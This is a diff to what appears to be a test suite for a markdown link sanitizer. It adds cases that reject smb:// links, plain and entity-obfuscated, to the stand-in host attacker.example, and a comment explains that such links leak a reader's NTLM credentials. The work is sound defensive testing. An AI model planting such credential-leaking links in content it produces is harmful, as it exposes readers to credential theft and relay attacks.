@@ -452,6 +452,12 @@ rejects('See [x](ms-settings:windowsdefender).', 'plain ms-settings: handler URL
 rejects('See [x](ms-gamingoverlay:broadcast).', 'plain ms-gamingoverlay: handler URL');
 rejects('See [x](ms-setti&#110;gs:windowsdefender).', 'entity-obfuscated ms-settings:');
 accepts('The Microsoft Store and the Settings app are described here only as prose.', 'benign Store/Settings app names are not the ms- schemes');
+// smb:// makes Windows open an SMB connection to the host, silently leaking the reader's
+// NTLM credentials — an NTLM-leak / relay credential-theft attack. The // form keeps prose
+// about the "SMB protocol".
+rejects('See [x](smb://attacker.example/share).', 'plain smb:// file-share URL');
+rejects('See [x](s&#109;b://attacker.example/share).', 'entity-obfuscated smb:// URL');
+accepts('The SMB protocol and Server Message Block are described here only as prose.', 'benign "SMB" prose is not the smb:// scheme');
 // intent: is the Android app-launch scheme — intent:[//host/path]#Intent;…;end hands the
 // URL to a native app. Per Chrome's syntax an optional host/path may sit between the
 // scheme and the required #Intent marker, so all of these forms are rejected; the
